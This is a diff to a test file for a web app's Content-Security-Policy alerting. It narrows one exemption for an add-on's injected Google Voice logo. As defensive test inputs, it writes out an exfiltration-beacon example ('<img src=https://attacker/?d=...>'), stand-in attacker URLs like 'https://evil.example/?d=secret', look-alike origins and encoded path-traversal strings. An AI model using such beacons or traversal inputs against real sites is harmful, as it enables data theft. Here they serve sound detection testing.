@@ -456,7 +456,7 @@ describe("the injected passive third-party class (#3417)", () => {
     }
   });
 
-  it("still pages a passive refusal that NAMES a script source (our own code)", async () => {
+  it("still pages a passive refusal that NAMES a script source", async () => {
     const { cspViolationPage } = await import("./csp");
     const d = cspViolationPage(summariseViolation(report({ "source-file": "https://slate.trypennie.app/app.js" })));
     expect(d.page).toBe(true);
@@ -484,7 +484,8 @@ describe("the injected passive third-party class (#3417)", () => {
 describe("the Google product logo an add-on injects, refused under img-src (#3699)", () => {
   // A browser add-on draws Google Voice's "click to call" logo beside a phone number, and
   // the enforced policy refuses it under img-src. Slate never loads it. It is logged, not
-  // paged, ONLY for that exact host AND the product logo path, with no named source: an
+  // paged, ONLY for that exact host AND the product logo path, with no named source (or
+  // a Slate page script as the source, #4063, below): an
   // image request to Google's own host carries nothing an attacker can collect. Every
   // other refused image keeps paging, because a third-party image can be an injected
   // exfiltration beacon (<img src=https://attacker/?d=...>).
@@ -547,9 +548,9 @@ describe("the Google product logo an add-on injects, refused under img-src (#369
     }
   });
 
-  it("still pages the Voice logo when the report NAMES a source", async () => {
+  it("still pages the Voice logo when the report names a source on another origin (#4063 narrows, never drops, this)", async () => {
     const { cspViolationPage } = await import("./csp");
-    const d = cspViolationPage(summariseViolation(report({ "source-file": "https://slate.trypennie.app/_next/static/chunks/a.js" })));
+    const d = cspViolationPage(summariseViolation(report({ "source-file": "https://evil.example/_next/static/chunks/a.js" })));
     expect(d.page).toBe(true);
   });
 
@@ -564,5 +565,141 @@ describe("the Google product logo an add-on injects, refused under img-src (#369
     const { cspViolationPage } = await import("./csp");
     const d = cspViolationPage(summariseViolation(report({ "blocked-uri": "https://fonts.gstatic.com/s/i/other/logo.png" })));
     expect(d).toMatchObject({ page: true, key: "csp_violation:img-src", directive: "img-src" });
+  });
+});
+
+describe("the Google product logo credited to a Slate page script (#4063)", () => {
+  // 2026-10-22 02:47Z: the Voice logo paged again on /book, this time with a named
+  // source, Slate's own chunk at the column where the embed's ResizeObserver reads
+  // scrollHeight. That read forces a layout, the add-on's injected image starts loading
+  // during it, and Chrome credits the load to whatever script is on the stack (L799). So
+  // a Slate page script as the source says only that Slate code was running, not that
+  // Slate asked for the image. The logo is logged also when the source is a script under
+  // /_next/static/ on the page's own origin; every other named source still pages.
+  const VOICE_LOGO =
+    "https://fonts.gstatic.com/s/i/productlogos/voice_2020q4/v7/web-24dp/logo_voice_2020q4_color_2x_web_24dp.png";
+  const CHUNK = "https://slate.trypennie.app/_next/static/chunks/1oy04_4tbw26c.js";
+  // The report as Chrome posted it, through the Reporting API.
+  const modern = (over: Record<string, unknown> = {}) => [
+    {
+      type: "csp-violation",
+      body: {
+        documentURL: "https://slate.trypennie.app/book",
+        referrer: "https://trypennie.com/",
+        effectiveDirective: "img-src",
+        blockedURL: VOICE_LOGO,
+        sourceFile: CHUNK,
+        lineNumber: 1,
+        columnNumber: 15104,
+        disposition: "enforce",
+        ...over,
+      },
+    },
+  ];
+  const legacy = (over: Record<string, unknown> = {}) => ({
+    "csp-report": {
+      "document-uri": "https://slate.trypennie.app/book?xbc=411",
+      referrer: "https://trypennie.com/",
+      "violated-directive": "img-src",
+      "blocked-uri": VOICE_LOGO,
+      "source-file": CHUNK,
+      "line-number": 1,
+      "column-number": 15104,
+      disposition: "enforce",
+      ...over,
+    },
+  });
+
+  it("logs, rather than pages, the exact report of 2026-10-22, in both report shapes", async () => {
+    const { cspViolationPage } = await import("./csp");
+    expect(cspViolationPage(summariseViolation(modern()))).toEqual({ page: false, why: "injected-passive" });
+    expect(cspViolationPage(summariseViolation(legacy()))).toEqual({ page: false, why: "injected-passive" });
+  });
+
+  it("logs it whatever page of Slate's it was on, the manage page with its token included", async () => {
+    const { cspViolationPage } = await import("./csp");
+    const d = cspViolationPage(
+      summariseViolation(
+        legacy({
+          "document-uri": "https://slate.trypennie.app/booking/manage/tok-secret",
+          "source-file": "https://slate.trypennie.app/_next/static/chunks/app/booking/manage/page-abc.js?v=1",
+        }),
+      ),
+    );
+    expect(d).toEqual({ page: false, why: "injected-passive" });
+  });
+
+  it("still pages the logo when the source is on any origin but the page's own", async () => {
+    const { cspViolationPage } = await import("./csp");
+    for (const sourceFile of [
+      "https://evil.example/_next/static/chunks/a.js",
+      "https://trypennie.com/_next/static/chunks/a.js", // the host page that embeds Slate
+      "https://slate.trypennie.app.evil.example/_next/static/chunks/a.js",
+      "https://evilslate.trypennie.app/_next/static/chunks/a.js",
+      "https://slate.trypennie.app:8443/_next/static/chunks/a.js",
+      "http://slate.trypennie.app/_next/static/chunks/a.js",
+      "blob:https://slate.trypennie.app/_next/static/chunks/a.js",
+    ]) {
+      expect(cspViolationPage(summariseViolation(modern({ sourceFile }))).page, sourceFile).toBe(true);
+    }
+  });
+
+  it("still pages the logo when a Slate source is outside /_next/static/, an inline or eval source included", async () => {
+    const { cspViolationPage } = await import("./csp");
+    for (const sourceFile of [
+      "https://slate.trypennie.app/book", // an inline script, credited to the document
+      "https://slate.trypennie.app/app.js",
+      "https://slate.trypennie.app/widget.js",
+      "https://slate.trypennie.app/_next/staticX/chunks/a.js",
+      "https://slate.trypennie.app/_next/static",
+      "https://slate.trypennie.app/x/_next/static/chunks/a.js",
+      "https://slate.trypennie.app/_next/image?url=/_next/static/a.js",
+      "https://slate.trypennie.app/_next/static/../../api/x.js",
+      "https://slate.trypennie.app/_next/static/%2e%2e/%2e%2e/api/x.js",
+      "inline",
+      "eval",
+      "wasm-eval",
+      "data:text/javascript,1",
+      "chunks/a.js",
+      "/_next/static/chunks/a.js",
+    ]) {
+      expect(cspViolationPage(summariseViolation(modern({ sourceFile }))).page, sourceFile).toBe(true);
+    }
+  });
+
+  it("still pages any image but the logo with a Slate chunk as its source", async () => {
+    const { cspViolationPage } = await import("./csp");
+    for (const blockedURL of [
+      "https://fonts.gstatic.com/s/i/other/logo.png",
+      "https://fonts.gstatic.com/s/mulish/x.png",
+      "https://fonts.gstatic.com/s/i/productlogos/../../../beacon.png",
+      "https://evil.example/s/i/productlogos/logo.png",
+      "https://evil.example/?d=secret",
+      "https://slate.trypennie.app/s/i/productlogos/logo.png",
+    ]) {
+      const d = cspViolationPage(summariseViolation(modern({ blockedURL })));
+      expect(d, blockedURL).toMatchObject({ page: true, key: "csp_violation:img-src" });
+    }
+  });
+
+  it("still pages the logo URL under any directive but img-src with a Slate chunk source", async () => {
+    const { cspViolationPage } = await import("./csp");
+    for (const effectiveDirective of ["style-src", "media-src", "connect-src", "script-src", "frame-src"]) {
+      expect(cspViolationPage(summariseViolation(modern({ effectiveDirective }))).page, effectiveDirective).toBe(true);
+    }
+  });
+
+  it("still pages a third-party FONT whose report names a Slate chunk: #4063 is the logo only", async () => {
+    const { cspViolationPage } = await import("./csp");
+    const d = cspViolationPage(
+      summariseViolation(modern({ effectiveDirective: "font-src", blockedURL: "https://fonts.gstatic.com/s/mulish/x.woff2" })),
+    );
+    expect(d).toMatchObject({ page: true, key: "csp_violation:font-src" });
+  });
+
+  it("pages when the document cannot be read, so the source cannot be proven the page's own", async () => {
+    const { cspViolationPage } = await import("./csp");
+    expect(cspViolationPage(summariseViolation(modern({ documentURL: "not a url" }))).page).toBe(true);
+    expect(cspViolationPage(summariseViolation(modern({ documentURL: undefined }))).page).toBe(true);
   });
 });
